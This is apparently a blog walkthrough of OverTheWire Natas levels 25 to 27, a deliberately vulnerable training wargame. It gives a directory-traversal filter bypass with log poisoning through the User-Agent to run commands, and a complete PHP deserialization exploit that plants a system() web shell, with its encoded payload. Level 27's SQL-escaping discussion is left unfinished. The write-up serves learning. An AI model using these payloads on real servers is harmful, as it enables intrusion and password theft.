Upgrade-Insecure-Requests: 1
```

Boosh.

## Level 25

What?

Lot of code here... is it all active?

OK, so we actually have three blocks of PHP code to look at, the first looks to be doing a bunch of stuff related to file inclusions, the second block is a for loop that looks to be listing some files from disk onto the page, finally the third block is acting like a `main` method in C, and is just calling some functions in order.

One thing we can discover when looking at the source code for this one is that we're using that janky `strstr` method again, which, as we discovered back in a previous challenge, is a bit weird in the way it actually looks for things in the string.

Bad news, we don't get to see if we hit something we shouldn't have, as the application is logging to the... logs... duh

..././

This challenge is a good example of why you should use frameworks or built-in functions to do things and not try to write your own methods. Take a look at this code snippet.

```
function safeinclude($filename){
        // check for directory traversal
        if(strstr($filename,"../")){
            logRequest("Directory traversal attempt! fixing request.");
            $filename=str_replace("../","",$filename);
        }
        // dont let ppl steal our passwords
        if(strstr($filename,"natas_webpass")){
            logRequest("Illegal file access detected! Aborting!");
            exit(-1);
        }
        // add more checks...

        if (file_exists($filename)) { 
            include($filename);
            return 1;
        }
        return 0;
    }
```

First thing we can see here is the `str_replace` function is being used to replace any `../`'s that we enter into our request. But it's not doing it very well. We can quite easily trick it into creating a proper `../` for us by just mucking about with the amount of dots and slashes we put on the file path. 

`..././` gets turned into `../`, then it's just a matter of working out how many we need to put into our request to force the directory traversal (we know there is DT because the comments tell us as much)

We also know that whatever we do is being written into a log file:

```
 function logRequest($message){
        $log="[". date("d.m.Y H::i:s",time()) ."]";
        $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
        $log=$log . " \"" . $message ."\"\n"; 
        $fd=fopen("/var/www/natas/natas25/logs/natas25_" . session_id() .".log","a");
        fwrite($fd,$log);
        fclose($fd);
    }
```

See^, log file.

So, our full request needs to look something like the following...

`GET /?lang=<breakouts>/var/www/natas/natas25/logs/natas25_<session_token>.log`

But, before we can do that, we need to figure out how many breakouts we need. 

`GET /?lang=..././..././..././..././.../etc/passwd`

That should echo back at you, if it doesn't then you don't have the correct amount of breakouts in there. 

Once you see that come back we need to figure out how to get the password for the next level. To do this we need to inspect the log file that is being created for our session token. 

```
[10.05.2018 03::41:34] Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0 "Directory traversal attempt! fixing request."
```

Huh, that looks like a UserAgent... 

Lets try something funky then...

Replace our UserAgent with the following:

```
<?php phpinfo(); ?>
```

Boosh. For those keeping score, that's a LFI, that leads to DT, which ends up as RCE... All from the same page! 

Now all we need to do is replace `phpinfo()` with `cat /etc/natas_webpass/natas26`

> Note: if you run into issues, you can just change your Session Token to whatever you like and use that instead of the autogenerated one. I ran into an issue where I ran the `cat` command wrong then the log file kept failing on that session. I ended up making a session token called `fred` :)

Swish. 

## Level 26

Mmmmm serialize (picture of Homer Simpson goes here)

Serialization is one of those things I've been meaning to look at for a while, and this is a nice excuse to start said looking. 

OK, so this one is a bit weird, we're being given the tools to "Draw a Line" on the page, that data is being sent up in a GET request, then the "line" is generated on the page.

Cool, lets take a look at the... oh... ok

Well this function grabs my attention straight away:

```
    function storeData(){
        $new_object=array();

        if(array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
            array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET)){
            $new_object["x1"]=$_GET["x1"];
            $new_object["y1"]=$_GET["y1"];
            $new_object["x2"]=$_GET["x2"];
            $new_object["y2"]=$_GET["y2"];
        }
        
        if (array_key_exists("drawing", $_COOKIE)){
            $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
        }
        else{
            // create new array
            $drawing=array();
        }
        
        $drawing[]=$new_object;
        setcookie("drawing",base64_encode(serialize($drawing)));
    }
```

It looks like we can decode the contents of the cookie, which could lend itself to doing something far more crafty.

TO THE BURPMOBILE! 

Fire up the decoder and grab the cookie from the request.

The cookie will look something like this initially. 

`YToxOntpOjA7YTo0OntzOjI6IngxIjtzOjI6IjEyIjtzOjI6InkxIjtzOjI6IjEyIjtzOjI6IngyIjtzOjI6IjEyIjtzOjI6InkyIjtzOjI6IjEyIjt9fQ%3D%3D`

Base64 decode that sucker:

`a:1:{i:0;a:4:{s:2:"x1";s:2:"12";s:2:"y1";s:2:"12";s:2:"x2";s:2:"12";s:2:"y2";s:2:"12";}fQ%3D%3D`

And URL decode the end part just for poops and giggles:

`a:1:{i:0;a:4:{s:2:"x1";s:2:"12";s:2:"y1";s:2:"12";s:2:"x2";s:2:"12";s:2:"y2";s:2:"12";}fQ==`

Ummm, hmmm, erm...

OK so that is clearly the values from the GET request being echo'ed back as the "Cookie" (drawing=)

Trying to mess around with the "Set-Cookie" header doesn't lead to much of use, it seems that the Cookie is being set by the application when you submit the GET request. 

Based on the previous challenge I've got the words "Directory Traversal" swimming around in my head. But that might be a false flag, so we'll keep anaylsing the code to be sure. 

> General rule for applications: if you allow users to provide input, sanitise it before processing it. 

With that little rule in mind, lets see what we can do to those inputs that are being encoded into the Cookie.

`GET /?x1=../../../../&y1=12&x2=12&y2=12 HTTP/1.1`

OK, so that gives us an error. Errors are good, they give us important feedback.

This error in particular causes the following message to be displayed:

```
<b>Warning</b>:  imageline() expects parameter 2 to be long, string given in <b>/var/www/natas/natas26/index.php</b> on line <b>66</b><br />
```

OK, so we did provide a string, but that initial value was just an Integer surely? We have two options here, either there is something else happening here, or the developer has made the application so that it will handle some pretty large numbers, for reasons. 

We get a similar error if we change the `x1` value to `x1[]`, except this time it says array insted of string. 

All making sense so far. 

So basically we have the following data flow:

1. User picks 4 values
2. Request is submitted as a GET
3. The contents of the request are de-serialized and base64 decoded
4. The de-serialized content is then base64 encoded and used as the "Set-Cookie" header
5. The values in the cookie are the same as the properties of the "line" that is generated

...

So, the way we need to solve this, is to serialize a class which does things that we want it to do. This will then be `unserialized` by the application, and our code will be executed. 

```
<?php
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file) {
            // initialise variables
            $this->initMsg = "";
            $this->exitMsg = "<?php echo(system(\$_GET['c']));?>";
            $this->logFile = $file;
      
            // write initial message
            $fd=fopen($this->logFile,"a+");
            #fwrite($fd,$initMsg);
            fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // write exit message
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$this->exitMsg);
            fclose($fd);
        }                       
    }

    $blah = new Logger("/var/www/natas/natas26/img/something.php");

    $fred = serialize([$blah]);
    print base64_encode($fred);
    unserialize($fred);
?>
```

This produces the following base64 string. 

```
YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvc29tZXRoaW5nLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjA6IiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjMzOiI8P3BocCBlY2hvKHN5c3RlbSgkX0dFVFsnYyddKSk7Pz4iO319
```

Adding this to the `drawing` variable then lets us create a file on the server called `something.php` which we can then give a variable `/?c=` 

## Level 27

> MYSQLi, or how I learned to stop worrying and love the single quote.  


```
function checkCredentials($link,$usr,$pass){
 
    $user=mysql_real_escape_string($usr);
    $password=mysql_real_escape_string($pass);
    
    $query = "SELECT username from users where username='$user' and password='$password' ";
    $res = mysql_query($query, $link);
    if(mysql_num_rows($res) > 0){
        return True;
    }
    return False;
}
```

By process of elimination (and a bit of common sense) we worked out that there was an active user account by the name of `natas28`, conviniently enough the username for the next level of the NATAS challenges. 

So, we have an issue:

The code uses `mysql_real_escape_string`, which checks for the following characters in a string and escapes them with backslashes:

- 0x00 (NULL)
- Newline (\n)
- Carriage return (\r)
- Double quotes (")
- Backslash (\\)
- 0x1A (Ctrl+Z)

Note that this function *ONLY* works when a string is wrapped in single quotes. Otherwise the query will be straight up injectable by the normal means.

Unfortunately for us, all of the queries are wrapped in this way. :sadface:

Basic injections don't give us anything of note. (although interestingly enough we can create a user that is a blank array... `username[]=`... which is somewhat interesting to say the least) And we can read in the sauce that the database is blitzed every 5 minutes, so we can't expect any persistence.

> Edit: coming back to this after a while away... I have literally no idea what is going on here anymore...


